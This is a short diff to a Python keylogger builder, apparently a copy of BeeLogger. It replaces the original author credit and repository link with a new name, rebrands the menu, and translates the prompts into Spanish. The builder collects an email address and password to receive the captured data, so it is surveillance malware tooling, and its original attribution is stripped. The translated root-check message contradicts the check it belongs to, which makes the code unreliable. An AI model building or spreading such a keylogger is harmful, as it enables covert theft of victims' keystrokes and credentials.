@@ -1,20 +1,20 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Copyright 2017 BeeLogger
-# Written by: * Alisson Moretto - 4w4k3
-# https://github.com/4w4k3/BeeLogger
+# Copyright 2017 KeyLogger
+# Written by: * Cristian Salinas - H4sh
+# 
 # Licensed under the BSD-3-Clause
 import os
 import sys
 import time
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 if not os.geteuid() == 0:
-    sys.exit('BeeLogger must be run as root')
+    sys.exit('Keylogger no puede ser utilizado como root')
 def clear():
     os.system('clear')
 def begin():
     os.system('sudo rm -Rf dist')
-# TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
+
     email = raw_input('Email donde vas a recibir los datos: ')
     epass = raw_input('Contraseña del email: ')
     print '\n'
@@ -63,7 +63,7 @@ def main():
     try:
         while True:
 
-            header = ('{0}HACK{1} > {2}'.format(YELLOW, WHITE, END))
+            header = ('{0}KeyLogger{1} > {2}'.format(YELLOW, WHITE, END))
             choice = raw_input(header)            
             if choice.upper() == 'Q' or choice.upper() == 'CERRAR':
 		clear()
